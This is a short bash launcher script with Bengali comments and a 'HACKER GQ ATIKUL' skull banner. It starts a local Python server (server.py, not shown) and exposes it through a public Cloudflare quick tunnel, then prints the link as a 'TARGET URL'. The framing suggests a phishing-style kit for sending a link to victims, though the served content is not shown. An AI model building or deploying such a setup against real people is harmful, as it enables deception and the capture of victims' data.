#!/bin/bash

# ১. পুরনো সার্ভিস ও ব্যাকগ্রাউন্ড লগ পরিষ্কার করা
fuser -k 5000/tcp 2>/dev/null
rm -f /root/tunnel.log

# ২. স্ক্রিন ক্লিয়ার করা
clear

# ৩. লোডিং অ্যানিমেশন
echo -e "\033[1;31m"
echo -n "Initializing Cyber Protocol"
for i in {1..3}; do
    echo -n "."
    sleep 0.3
done
echo -e "\033[0m"
clear

# ৪. ভয়ঙ্কর ডেমন স্কালের ব্যানার প্রিন্ট ফাংশন
print_banner() {
    echo -e "\033[1;31m      .---.          .---."
    echo -e "     /     \\        /     \\"
    echo -e "    |   ()  |      |  ()   |"
    echo -e "     \\     / \\    / \\     /"
    echo -e "      '---'   \\  /   '---'"
    echo -e "               \\/"
    echo -e "         .---._____.---."
    echo -e "        /             \\ "
    echo -e "       |   \\_______/   |"
    echo -e "        \\             / "
    echo -e "         '-----------'"
    echo -e "\033[1;33m       [!] HACKER GQ ATIKUL [!]"
    echo -e "\033[1;31m======================================================================\033[0m"
}

print_banner

echo -e "\n\033[1;32m[x] Initializing Python Server & Secure Tunnel...\033[0m"

# ৫. পাইথন সার্ভার ব্যাকগ্রাউন্ডে চালু করা
python3 /sdcard/Download/server.py > /dev/null 2>&1 & 
sleep 2

# ৬. ক্লাউডফ্লেয়ার টানেল ব্যাকগ্রাউন্ডে চালানো
/root/cloudflared tunnel --url http://localhost:5000 > /root/tunnel.log 2>&1 &

echo -e "\033[1;33m[x] Establishing secure connection...\033[0m"

# ৭. ১৫ সেকেন্ডের লুপ চেক
URL=""
for i in {1..15}; do
    sleep 1
    URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' /root/tunnel.log | head -n 1)
    if [ -n "$URL" ]; then
        break
    fi
done

# ৮. স্ক্রিন পরিষ্কার করে ভয়ঙ্কর ব্যানারসহ ফাইনাল লিংক প্রদর্শন
clear
print_banner

if [ -n "$URL" ]; then
    echo -e "\n\033[1;32m[+] SECURE TUNNEL ESTABLISHED SUCCESSFULLY!\033[0m"
    echo -e "\033[1;37m----------------------------------------------------------------------\033[0m"
    echo -e "\033[1;36m  TARGET URL : \033[1;33m$URL\033[0m"
    echo -e "\033[1;37m----------------------------------------------------------------------\033[0m\n"
else
    echo -e "\n\033[1;31m[-] ERROR: Tunnel connection failed. Check your internet connection.\033[0m\n"
fi

# ৯. সেশন ধরে রাখা
wait